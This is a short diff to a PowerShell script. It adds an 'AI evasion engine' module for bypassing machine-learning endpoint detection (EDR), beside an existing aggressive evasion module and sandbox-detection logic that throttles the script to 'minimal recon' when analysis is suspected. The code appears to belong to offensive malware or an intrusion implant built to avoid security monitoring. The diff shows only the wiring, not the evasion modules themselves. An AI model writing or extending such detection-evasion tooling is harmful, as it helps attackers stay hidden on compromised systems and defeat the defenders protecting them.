@@ -92,9 +92,16 @@ $ProgressPreference    = "SilentlyContinue"
 # ══════════════════════════════════════════════════════════════════════════
 
 $evasionPath = Join-Path $PSScriptRoot "evasion.ps1"
+$aiEvasionPath = Join-Path $PSScriptRoot "ai_evasion.ps1"
 if (Test-Path $evasionPath) {
     . $evasionPath
     $evasionReport = Initialize-Evasion -AggressiveMode
+    # Load AI evasion engine for ML-based EDR bypass
+    if (Test-Path $aiEvasionPath) {
+        . $aiEvasionPath
+        $aiReport = Initialize-AIEvasion
+        MLog "AI Evasion v$($aiReport.Version) loaded. Mimic: $($aiReport.MimicProfile)"
+    }
     # If sandbox detected with extreme confidence and not aggressive, throttle
     if ($evasionReport.sandbox -and $evasionReport.sandbox.Score -ge 15) {
         # We are likely in a sandbox — run minimal recon only
